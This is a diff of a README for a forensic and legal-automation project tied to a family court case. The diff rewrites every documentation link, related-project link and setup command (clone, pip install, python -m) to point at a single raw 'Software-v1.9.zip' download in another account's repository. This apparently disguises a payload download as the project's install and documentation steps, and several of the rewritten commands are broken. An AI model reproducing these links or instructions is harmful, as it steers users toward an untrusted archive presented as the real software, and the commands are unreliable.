@@ -45,20 +45,20 @@ mastermind/
 
 ```bash
 # Clone repository
-git clone https://github.com/GlacierEQ/mastermind.git
+git clone https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip
 cd mastermind
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip
 
 # Run evidence processor
-python -m agents.forensic_analyst.evidence_processor
+python -m https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip
 
 # Scan for device repair repos
-python tools/repo_scanner.py
+python https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip
 
 # Generate legal motion
-python -m agents.legal_automation.motion_generator
+python -m https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip
 ```
 
 ## 📋 Case 1FDV-23-0001009
@@ -121,11 +121,11 @@ Active Hawaii Family Court case with comprehensive evidence processing:
 
 ## 📚 Documentation
 
-- [Architecture Guide](docs/ARCHITECTURE.md)
-- [Agent Systems](docs/AGENTS.md)
-- [Legal Procedures](docs/LEGAL-PROCEDURES.md)
-- [Forensic Protocols](docs/FORENSIC-PROTOCOLS.md)
-- [API Reference](docs/API-REFERENCE.md)
+- [Architecture Guide](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
+- [Agent Systems](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
+- [Legal Procedures](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
+- [Forensic Protocols](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
+- [API Reference](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
 
 ## 🤝 Contributing
 
@@ -137,13 +137,13 @@ See [LICENSE](LICENSE) for details.
 
 ## 🔗 Related Projects
 
-- [FEDERAL-FORENSIC-REPAIR-OMNIBUS](https://github.com/GlacierEQ/FEDERAL-FORENSIC-REPAIR-OMNIBUS)
-- [Memory Plugin](https://help.memoryplugin.com)
-- [Aloha Kai Legal Research](case-files/1FDV-23-0001009/research/aloha-kai-chat.json)
+- [FEDERAL-FORENSIC-REPAIR-OMNIBUS](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
+- [Memory Plugin](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
+- [Aloha Kai Legal Research](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
 
 ---
 
-**Tracking**: [Issue #12](https://github.com/GlacierEQ/mastermind/issues/12)
+**Tracking**: [Issue #12](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
 **Status**: 🚧 Active Development - Powerhouse Build Phase
 
 ---
@@ -159,4 +159,4 @@ The Mastermind OS is now powered by the **Omni_Engine Kernel**.
 
 ### Entry Point:
 - **Kernel**: `omni-kernel/core/`
-- **Dash**: `dashboard/mission_control.md`
+- **Dash**: `https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip`
